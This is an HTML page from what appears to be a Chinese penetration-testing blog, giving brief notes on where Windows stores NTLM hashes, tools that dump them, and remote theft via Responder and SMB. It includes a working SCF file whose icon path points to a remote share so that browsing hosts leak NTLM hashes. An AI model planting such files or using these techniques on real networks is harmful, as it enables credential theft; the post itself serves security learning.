@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>获取 NTLM - Geekby&#39;s Blog</title><meta name="Description" content="获取 NTLM"><meta property="og:title" content="获取 NTLM" />
+<meta property="og:description" content="获取 NTLM" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/05/%E8%8E%B7%E5%8F%96-ntlm/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-09T10:38:00+08:00" />
+<meta property="article:modified_time" content="2020-05-09T10:38:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="获取 NTLM"/>
+<meta name="twitter:description" content="获取 NTLM"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/05/%E8%8E%B7%E5%8F%96-ntlm/" /><link rel="prev" href="https://www.geekby.site/2020/05/dcshadow-%E6%94%BB%E5%87%BB/" /><link rel="next" href="https://www.geekby.site/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "获取 NTLM",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/05\/%E8%8E%B7%E5%8F%96-ntlm\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "域安全, 内网渗透, NTLM","wordcount":  95 ,
+        "url": "https:\/\/www.geekby.site\/2020\/05\/%E8%8E%B7%E5%8F%96-ntlm\/","datePublished": "2020-05-09T10:38:00+08:00","dateModified": "2020-05-09T10:38:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "获取 NTLM"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">获取 NTLM</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-09">2020-05-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 95 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-相关背景">1 相关背景</a>
+      <ul>
+        <li><a href="#11-ntlm-的存储位置">1.1 NTLM 的存储位置:</a></li>
+        <li><a href="#12-ntlm-的获取方式">1.2 NTLM 的获取方式</a></li>
+        <li><a href="#13-ntlm-的形式">1.3 NTLM 的形式</a></li>
+        <li><a href="#14-远程获取方式窃取">1.4 远程获取方式(窃取):</a></li>
+        <li><a href="#adv-170014-ntlm-sso">ADV 170014 NTLM SSO</a></li>
+        <li><a href="#攻击场景">攻击场景</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="获取-ntlm">获取 NTLM</h1>
+<h2 id="1-相关背景">1 相关背景</h2>
+<h3 id="11-ntlm-的存储位置">1.1 NTLM 的存储位置:</h3>
+<p>1、系统数据库 SAM (Security Account Manager)</p>
+<p>2、DIT 数据库</p>
+<p>3、内存 Cache</p>
+<h3 id="12-ntlm-的获取方式">1.2 NTLM 的获取方式</h3>
+<p>1、从 SAM 获取</p>
+<p>2、内存获取</p>
+<p>3、DIT 数据库获取</p>
+<p>4、WCE、PWDUMP、MIMIKATZ&hellip;</p>
+<h3 id="13-ntlm-的形式">1.3 NTLM 的形式</h3>
+<p>aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42</p>
+<p>LMHash (windows 2008 R2系统以后系统默认不保存 LMHash)</p>
+<p>NTHash</p>
+<p>NetHash - 主要获取该种 hash</p>
+<h3 id="14-远程获取方式窃取">1.4 远程获取方式(窃取):</h3>
+<p>1、Responder</p>
+<p>2、HTTP + SMB</p>
+<p>3、<strong>SCF + SMB</strong></p>
+<p>4、SQL + SMB</p>
+<h3 id="adv-170014-ntlm-sso">ADV 170014 NTLM SSO</h3>
+<p>2017 年 10 月，微软在周二补丁日公布了一份安全公告(ADV170014)，这份安全公告中提到了 NTLM 身份验证方案中的一个漏洞，恶意攻击者可以利用这个漏洞来窃取哈希。</p>
+<p>攻击者只需要将一个恶意的 SCF 文件放置在可公开访问的 Windows 文件夹中即可。</p>
+<p>一旦文件被放在文件夹中，就会被一个神秘的 bug 执行。它会收集目标的 NTLM 密码散列，并将其发送到一个配置服务器中。</p>
+<p>目标主机存在没有设置密码保护的一个共享文件夹，这种场景非常常见，比如办公室、学校、医院以及大多数 Windows 环境中，人们都会通过共享文件夹来共享音乐、照片以及文档。</p>
+<h3 id="攻击场景">攻击场景</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105732.png-water_print" /></p>
+<p>非正版系统可能没有该设置：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509105840.png-water_print" /></p>
+<p>微软在 Windows 3.11 时引入了 SCF 文件。SCF文件其实是纯文本文件，可以用来指导 Windows 文件资源管理器执行一些基本任务。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[Shell]
+Command=2 
+IconFile=\\192.168.1.2\sharetest.ico 
+[Taskbar] 
+Command=ToggleDesktop
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200509110136.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-05-09</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/05/%E8%8E%B7%E5%8F%96-ntlm/" data-title="获取 NTLM"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/05/%E8%8E%B7%E5%8F%96-ntlm/" data-title="获取 NTLM"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/05/%E8%8E%B7%E5%8F%96-ntlm/" data-title="获取 NTLM"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>,&nbsp;<a href="/tags/ntlm/">NTLM</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/05/dcshadow-%E6%94%BB%E5%87%BB/" class="prev" rel="prev" title="DCShadow 攻击"><i class="fas fa-angle-left fa-fw"></i>DCShadow 攻击</a>
+            <a href="/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="next" rel="next" title="NTLM Relay">NTLM Relay<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
